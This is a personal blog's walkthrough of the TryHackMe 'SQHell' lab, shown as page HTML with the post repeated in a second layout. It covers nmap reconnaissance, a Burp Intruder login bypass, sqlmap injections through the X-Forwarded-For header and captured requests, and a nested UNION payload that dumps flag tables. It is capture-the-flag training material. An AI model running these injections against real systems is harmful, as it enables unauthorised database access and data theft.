<!DOCTYPE html>
<html lang="en">
  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="This is my personal website. The purpose of the Website is to assist and monitor my own development.">
<meta name="google-site-verification" content="NeMnHGyDeeJqt9s_pg03TI1foYUOvLwrHreqLj_mgRE">
<meta name="language" content="en">

<!-- Twitter And Open Graph Meta -->
<!-- Open Graph Meta Tags -->
<meta property="og:title" content="TryHackMe - SQHell">
<meta property="og:type" content="Article">
<meta property="og:url" content="http://localhost:4000/tryhackme-sqhell/">
<meta name="image" property="og:image" content="/assets/img/avatar.jpg">
<meta property="og:image:alt" content="">
<meta property="og:site_name" content="Mr0Wido's Blog">
<meta property="og:locale" content="en_US">

<!-- Twitter Meta Tags -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@">
<meta name="twitter:title" content="TryHackMe - SQHell">
<meta name="twitter:image" content="/assets/img/avatar.jpg">



<!-- css -->
<link rel="shortcut icon" href="/assets/img/favicon.ico" type="ico">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<link rel="canonical" href="/tryhackme-sqhell/">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



<title>TryHackMe - SQHell - Mr0Wido's Blog</title>



<!-- Script -->
<script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
<script src="https://kit.fontawesome.com/d54796acd1.js" crossorigin="anonymous"></script>





    <title>TryHackMe - SQHell - Mr0Wido's Blog</title>
    <link rel="stylesheet" type="text/css" href="/assets/css/main.css">
    
  
  </head>
  <body>
    <header class="site-header">
  <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
  <div class="site-title">
    <a href="http://localhost:4000">Mr0Wido's Blog</a>
  </div>
  <nav class="site-nav">
    <ul class="site-nav__list">
      <li class="site-nav__item">
        <a class="site-nav__link " href="/">Home</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/whoami/">Whoami</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/posts/">Posts</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/projects/">Projects</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/cv/">CV</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/categories/">Categories</a>
      </li>
      <li class="site-nav__item">
        <div class="search">
          <input type="text" id="search-input" placeholder="Search...">
          <i class="fas fa-search"></i>
          <ul id="results-container"></ul>
        </div>
      </li>
    </ul>
  </nav>
</header>


<!-- 360 to 980 -->
<header class="header-mobile">
  <div class="header-inner clearfix">
    <div class="nav-btn nav-slider">
      <i class="fa-solid fa-bars"></i>
    </div>
    <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
    <div class="site-title">
      <a href="http://localhost:4000">Mr0Wido's Blog</a>
    </div>
  </div>
</header>
<nav class="sidebar">
  <div class="nav-header">
    <div class="nav-search">
      <div class="search">
        <i class="fas fa-search"></i>
        <input type="search" name="search" id="search-input" placeholder="Search...">
        <ul id="results-container"></ul>
      </div>
    </div>
  </div>
  <ul class="nav-categories ul-base">
    <li><a class="site-nav__link " href="/">Home</a></li>
    <li><a class="site-nav__link " href="/whoami/">Whoami</a></li>
    <li><a class="site-nav__link " href="/posts/">Posts</a></li>
    <li><a class="site-nav__link " href="/projects/">Projects</a></li>
    <li><a class="site-nav__link " href="/cv/">CV</a></li>
    <li><a class="site-nav__link " href="/categories/">Categories</a></li>
  </ul>
  <ul class="social ul-base">
    <li><a href="https://twitter.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i></a></li>
    <li><a href="https://instagram.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i></a></li>
    <li><a href="https://www.linkedin.com/in/" itemprop="sameAs" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a></li>
    <li><a href="https://github.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-github" aria-hidden="true"></i></a></li>
  </ul>
  <div class="copyright">
    <span> © Copyright 2025 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a></span>
  </div>
</nav>
<div class="overlay"></div>
    
    <div class="container-default">
      <div class="content-container">
        <main class="default">
          <div class="post">
  <h1 class="post__title">TryHackMe - SQHell</h1>
  <div class="post__content">
    <p>Try and find all the flags in the SQL Injections.</p>

<p>Give the machine a minute to boot and then connect to http://MACHINE_IP</p>

<p>There are 5 flags to find but you have to defeat the different SQL injection types.</p>

<p>Hint: Unless displayed on the page the flags are stored in the flag table in the flag column.</p>

<p><br></p>

<h3 id="flag-1">Flag 1</h3>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">Nmap</code> scan to gather information about the target.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.60.81
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/nmap.png" alt="nmap"></p>

<p>As we see <code class="language-plaintext highlighter-rouge">22/tcp and 80/tcp</code> ports are open.</p>

<p>Let’s <code class="language-plaintext highlighter-rouge">explore the website</code> accessible through the HTTP port.</p>

<p>We can see, <code class="language-plaintext highlighter-rouge">two posts shared by the admin</code> on the website.</p>

<p>And looks like three pages on the homepage. These are the <code class="language-plaintext highlighter-rouge">Terms &amp; Conditions page</code>, a <code class="language-plaintext highlighter-rouge">login</code>, and a <code class="language-plaintext highlighter-rouge">register</code> page.</p>

<p><img src="/assets/img/tryhackme/sqhell/home.png" alt="home"></p>

<p>Let’s click on the admin and see what’s in there.</p>

<p><img src="/assets/img/tryhackme/sqhell/admin.png" alt="admin"></p>

<p>We can see the admin’s ID. And the admin’s two posts.</p>

<p>Let’s go to the <code class="language-plaintext highlighter-rouge">login page and try bypassing</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/login.png" alt="login"></p>

<p>First, we’ll capture the login page request using BurpSuite and <code class="language-plaintext highlighter-rouge">forward it to Intruder</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/intruder.png" alt="intruder"></p>

<p>After that, we’ll copy the <a href="https://github.com/payloadbox/sql-injection-payload-list#sql-injection-auth-bypass-payloads">payload</a> list and paste it into BurpSuite.</p>

<p><img src="/assets/img/tryhackme/sqhell/payload.png" alt="payload"></p>

<p>Now let’s start an attack and see the results.</p>

<p><img src="/assets/img/tryhackme/sqhell/flag-1.png" alt="flag-1"></p>

<p>Success! We found the <code class="language-plaintext highlighter-rouge">first flag</code>.</p>

<p><br></p>

<h3 id="flag-2">Flag 2</h3>

<p><strong><code class="language-plaintext highlighter-rouge">Hint: Make sure to read the terms and conditions ;)</code></strong></p>

<p>Let’s check the <code class="language-plaintext highlighter-rouge">terms and conditions</code> page.</p>

<p><img src="/assets/img/tryhackme/sqhell/term.png" alt="term"></p>

<p>An interesting condition is mentioned here.</p>

<p><strong><code class="language-plaintext highlighter-rouge">iii: We log your IP address for analytics purposes</code></strong></p>

<p>We can derive the following from this. This website may be performing <code class="language-plaintext highlighter-rouge">IP-based security</code> checks or access controls. This can be done using <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code>.</p>

<p><code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> is used to preserve the real IP address of the client while passing the HTTP request between servers. If intermediate servers like proxy servers or load balancers are used, the actual client IP address can be lost, and the IP addresses of these intermediate servers are passed to the server. The <code class="language-plaintext highlighter-rouge">X-Forwarded-For header is used to fix this situation</code>. Intermediate servers can forward the real client IP address by adding it to the X-Forwarded-For header. In this way, the server can identify the correct IP address by reading the real client’s IP address from the X-Forwarded-For header. However, these <code class="language-plaintext highlighter-rouge">headers can be manipulated, and fake IP addresses can be added</code>.</p>

<p>To manipulate the X-Forwarded-For header for this purpose, we will use the <code class="language-plaintext highlighter-rouge">"--headers='X-forwarded-for:1*'"</code>parameter in sqlmap.</p>

<p>The <code class="language-plaintext highlighter-rouge">"--headers='X-forwarded-for:1*'"</code> parameter allows the sqlmap tool to automatically perform this manipulation. By adding the expression <code class="language-plaintext highlighter-rouge">"1*"</code> to the header, the beginning of an IP address is specified as the header value. This is used to try different scenarios when attempting to bypass IP-based controls or restrictions in a web application.</p>

<p>Let’s do the attack.</p>

<p><img src="/assets/img/tryhackme/sqhell/sqlmap.png" alt="sqlmap"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap --dbms mysql --headers="X-forwarded-for:1*" -u http://10.10.60.81/

</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Great!</code> We found a <code class="language-plaintext highlighter-rouge">Time-Based Blind SQLi</code> vulnerability.</p>

<p><img src="/assets/img/tryhackme/sqhell/time.png" alt="time"></p>

<p>Let’s get the <code class="language-plaintext highlighter-rouge">Flag-2</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap --dbms mysql --headers="X-forwarded-for:1*" -u http://10.10.60.81/ -D sqhell_1 --dump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/flag-2.png" alt="flag-2"></p>

<p><br></p>

<h3 id="flag-3">Flag 3</h3>

<p>Let’s go to the <code class="language-plaintext highlighter-rouge">register page</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/register.png" alt="register"></p>

<p>Capture the request and save it using BurpSuite <code class="language-plaintext highlighter-rouge">(Right Click &gt; Save Item)</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/cap-reg.png" alt="cap-reg"></p>

<p>Perform a sqlmap scan on the captured request.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test6.req -D sqhell_3 -T flag --dump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/flag-3.png" alt="flag-3"></p>

<p>We found <code class="language-plaintext highlighter-rouge">Flag-3</code>.</p>

<p><br></p>

<h3 id="flag-4">Flag 4</h3>

<p><strong><code class="language-plaintext highlighter-rouge">Hint: Well, dreams, they feel real while we're in them right?</code></strong></p>

<p>Now, let’s return to the <code class="language-plaintext highlighter-rouge">user page</code>. You can see the URL <code class="language-plaintext highlighter-rouge">endpoint is /user?id=1</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/user.png" alt="user"></p>

<p>So, I try <code class="language-plaintext highlighter-rouge">id=2-1</code> for the <code class="language-plaintext highlighter-rouge">vulnerability detection</code>. And it’s <code class="language-plaintext highlighter-rouge">working</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/detect.png" alt="detect"></p>

<p>So, let’s <code class="language-plaintext highlighter-rouge">capture the request</code> and <code class="language-plaintext highlighter-rouge">scan it using sqlmap</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test5.req --dbs   
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/sqhell-4.png" alt="sqhell-4"></p>

<p>We found the <code class="language-plaintext highlighter-rouge">sqhell_4 table</code> but the flag is <code class="language-plaintext highlighter-rouge">not in there</code>. Let’s try the <code class="language-plaintext highlighter-rouge">UNION payload</code> on the website.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> /user?id=-1 UNION ALL SELECT "1 UNION SELECT 1,flag,3,4 FROM flag-- -", 1,2 FROM users#
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/flag-4.png" alt="flag-4"></p>

<p><code class="language-plaintext highlighter-rouge">Success!</code> We found <code class="language-plaintext highlighter-rouge">Flag-4</code>.</p>

<p><br></p>

<h3 id="flag-5">Flag 5</h3>

<p>Now, only the <code class="language-plaintext highlighter-rouge">post page</code> that we didn’t look at.</p>

<p><img src="/assets/img/tryhackme/sqhell/post.png" alt="post"></p>

<p>As we see the <code class="language-plaintext highlighter-rouge">endpoint is /post?id=1</code>.</p>

<p>Now, let’s capture the request and <code class="language-plaintext highlighter-rouge">scan with sqlmap</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r one.req -D sqhell_5 -T flag --dump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/flag-5.png" alt="flag-5"></p>

<p>This one is easy. We found the <code class="language-plaintext highlighter-rouge">last flag</code>.</p>

<p><br></p>

<p><code class="language-plaintext highlighter-rouge">Congratulations!</code> We have successfully completed the steps to find all the flags. It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care <img class="emoji" title=":wave:" alt=":wave:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f44b.png" height="20" width="20"></p>

<p><br></p>

  </div>
  <div class="post__footer">
    <p class="post__date">
      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Jul 06, 2023</p>
    <div class="post__categories">
      
      
      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
            
    </div>      
    
    <div class="post__tags">
      <p class="post__tags-title">
        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
        <span class="post__tags-container">
          
          <span class="post__tags-item">web, mysql, sqli</span>
          
        </span>
      </p>
    </div>
    
  </div>
</div>
<br>
<!-- Twitter Share Button -->
<a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20SQHell&url=http://localhost:4000/tryhackme-sqhell/&amp;via=Mr0Wido" target="_blank" rel="noopener noreferrer" class="share-btn tweet-btn" title="Share on Twitter">
    Tweet
</a>
  
<!-- LinkedIn Share Button -->
<a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/tryhackme-sqhell/" target="_blank" rel="noopener noreferrer" class="share-btn" title="Share on LinkedIn">
    LinkedIn
</a>
  
  

<br>


<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    this.page.url = 'http://localhost:4000/tryhackme-sqhell/';
    this.page.identifier = '/tryhackme-sqhell';
    
    };

    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
</noscript>



        </main>
      </div>
      <div class="author-container">
        


<div itemscope itemtype="https://schema.org/Person" class="author-card">

  
    <div class="author__avatar">
        <img src="/assets/img/avatar.jpg" alt="Mr0Wido's Blog" itemprop="image" class="u-photo">
    </div>
  
  <div class="author__content-head">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am passionate about all things technology-related. My thirst for knowledge knows no bounds, and I consider myself a lifelong learner.</p>

        </div>
      
    </div>
  
    <div class="author__urls-wrapper">
      <ul class="author__urls social-icons">
        
          
            
              <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
            
          
            
              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
            
          
            
              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
            
          
            
              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
            
          
            
              <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
            
          
        
  
        
  
        
          <li>
            <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
              <meta itemprop="email" content="mr0wido@protonmail.com">
              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
            </a>
          </li>
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
      </ul>
    </div>
  </div>
  <div class="author__content-head-medium">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am passionate about all things technology-related. My thirst for knowledge knows no bounds, and I consider myself a lifelong learner.</p>

        </div>
      
      <div class="author__urls-wrapper">
        <ul class="author__urls social-icons">
          
            
              
                <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
              
            
              
                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
              
            
              
                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
              
            
              
                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
              
            
              
                <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
              
            
          
    
          
    
          
            <li>
              <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
                <meta itemprop="email" content="mr0wido@protonmail.com">
                <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
              </a>
            </li>
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
        </ul>
      </div>
    </div>
  

  </div>
</div>

      </div>
    </div>

    <div class="container-medium">
      <div class="author-container">
        


<div itemscope itemtype="https://schema.org/Person" class="author-card">

  
    <div class="author__avatar">
        <img src="/assets/img/avatar.jpg" alt="Mr0Wido's Blog" itemprop="image" class="u-photo">
    </div>
  
  <div class="author__content-head">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am passionate about all things technology-related. My thirst for knowledge knows no bounds, and I consider myself a lifelong learner.</p>

        </div>
      
    </div>
  
    <div class="author__urls-wrapper">
      <ul class="author__urls social-icons">
        
          
            
              <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
            
          
            
              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
            
          
            
              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
            
          
            
              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
            
          
            
              <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
            
          
        
  
        
  
        
          <li>
            <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
              <meta itemprop="email" content="mr0wido@protonmail.com">
              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
            </a>
          </li>
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
      </ul>
    </div>
  </div>
  <div class="author__content-head-medium">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am passionate about all things technology-related. My thirst for knowledge knows no bounds, and I consider myself a lifelong learner.</p>

        </div>
      
      <div class="author__urls-wrapper">
        <ul class="author__urls social-icons">
          
            
              
                <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
              
            
              
                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
              
            
              
                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
              
            
              
                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
              
            
              
                <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
              
            
          
    
          
    
          
            <li>
              <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
                <meta itemprop="email" content="mr0wido@protonmail.com">
                <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
              </a>
            </li>
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
        </ul>
      </div>
    </div>
  

  </div>
</div>

      </div>
      <div class="content-container">
        <main class="default">
          <div class="post">
  <h1 class="post__title">TryHackMe - SQHell</h1>
  <div class="post__content">
    <p>Try and find all the flags in the SQL Injections.</p>

<p>Give the machine a minute to boot and then connect to http://MACHINE_IP</p>

<p>There are 5 flags to find but you have to defeat the different SQL injection types.</p>

<p>Hint: Unless displayed on the page the flags are stored in the flag table in the flag column.</p>

<p><br></p>

<h3 id="flag-1">Flag 1</h3>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">Nmap</code> scan to gather information about the target.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.60.81
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/nmap.png" alt="nmap"></p>

<p>As we see <code class="language-plaintext highlighter-rouge">22/tcp and 80/tcp</code> ports are open.</p>

<p>Let’s <code class="language-plaintext highlighter-rouge">explore the website</code> accessible through the HTTP port.</p>

<p>We can see, <code class="language-plaintext highlighter-rouge">two posts shared by the admin</code> on the website.</p>

<p>And looks like three pages on the homepage. These are the <code class="language-plaintext highlighter-rouge">Terms &amp; Conditions page</code>, a <code class="language-plaintext highlighter-rouge">login</code>, and a <code class="language-plaintext highlighter-rouge">register</code> page.</p>

<p><img src="/assets/img/tryhackme/sqhell/home.png" alt="home"></p>

<p>Let’s click on the admin and see what’s in there.</p>

<p><img src="/assets/img/tryhackme/sqhell/admin.png" alt="admin"></p>

<p>We can see the admin’s ID. And the admin’s two posts.</p>

<p>Let’s go to the <code class="language-plaintext highlighter-rouge">login page and try bypassing</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/login.png" alt="login"></p>

<p>First, we’ll capture the login page request using BurpSuite and <code class="language-plaintext highlighter-rouge">forward it to Intruder</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/intruder.png" alt="intruder"></p>

<p>After that, we’ll copy the <a href="https://github.com/payloadbox/sql-injection-payload-list#sql-injection-auth-bypass-payloads">payload</a> list and paste it into BurpSuite.</p>

<p><img src="/assets/img/tryhackme/sqhell/payload.png" alt="payload"></p>

<p>Now let’s start an attack and see the results.</p>

<p><img src="/assets/img/tryhackme/sqhell/flag-1.png" alt="flag-1"></p>

<p>Success! We found the <code class="language-plaintext highlighter-rouge">first flag</code>.</p>

<p><br></p>

<h3 id="flag-2">Flag 2</h3>

<p><strong><code class="language-plaintext highlighter-rouge">Hint: Make sure to read the terms and conditions ;)</code></strong></p>

<p>Let’s check the <code class="language-plaintext highlighter-rouge">terms and conditions</code> page.</p>

<p><img src="/assets/img/tryhackme/sqhell/term.png" alt="term"></p>

<p>An interesting condition is mentioned here.</p>

<p><strong><code class="language-plaintext highlighter-rouge">iii: We log your IP address for analytics purposes</code></strong></p>

<p>We can derive the following from this. This website may be performing <code class="language-plaintext highlighter-rouge">IP-based security</code> checks or access controls. This can be done using <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code>.</p>

<p><code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> is used to preserve the real IP address of the client while passing the HTTP request between servers. If intermediate servers like proxy servers or load balancers are used, the actual client IP address can be lost, and the IP addresses of these intermediate servers are passed to the server. The <code class="language-plaintext highlighter-rouge">X-Forwarded-For header is used to fix this situation</code>. Intermediate servers can forward the real client IP address by adding it to the X-Forwarded-For header. In this way, the server can identify the correct IP address by reading the real client’s IP address from the X-Forwarded-For header. However, these <code class="language-plaintext highlighter-rouge">headers can be manipulated, and fake IP addresses can be added</code>.</p>

<p>To manipulate the X-Forwarded-For header for this purpose, we will use the <code class="language-plaintext highlighter-rouge">"--headers='X-forwarded-for:1*'"</code>parameter in sqlmap.</p>

<p>The <code class="language-plaintext highlighter-rouge">"--headers='X-forwarded-for:1*'"</code> parameter allows the sqlmap tool to automatically perform this manipulation. By adding the expression <code class="language-plaintext highlighter-rouge">"1*"</code> to the header, the beginning of an IP address is specified as the header value. This is used to try different scenarios when attempting to bypass IP-based controls or restrictions in a web application.</p>

<p>Let’s do the attack.</p>

<p><img src="/assets/img/tryhackme/sqhell/sqlmap.png" alt="sqlmap"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap --dbms mysql --headers="X-forwarded-for:1*" -u http://10.10.60.81/

</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Great!</code> We found a <code class="language-plaintext highlighter-rouge">Time-Based Blind SQLi</code> vulnerability.</p>

<p><img src="/assets/img/tryhackme/sqhell/time.png" alt="time"></p>

<p>Let’s get the <code class="language-plaintext highlighter-rouge">Flag-2</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap --dbms mysql --headers="X-forwarded-for:1*" -u http://10.10.60.81/ -D sqhell_1 --dump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/flag-2.png" alt="flag-2"></p>

<p><br></p>

<h3 id="flag-3">Flag 3</h3>

<p>Let’s go to the <code class="language-plaintext highlighter-rouge">register page</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/register.png" alt="register"></p>

<p>Capture the request and save it using BurpSuite <code class="language-plaintext highlighter-rouge">(Right Click &gt; Save Item)</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/cap-reg.png" alt="cap-reg"></p>

<p>Perform a sqlmap scan on the captured request.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test6.req -D sqhell_3 -T flag --dump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/flag-3.png" alt="flag-3"></p>

<p>We found <code class="language-plaintext highlighter-rouge">Flag-3</code>.</p>

<p><br></p>

<h3 id="flag-4">Flag 4</h3>

<p><strong><code class="language-plaintext highlighter-rouge">Hint: Well, dreams, they feel real while we're in them right?</code></strong></p>

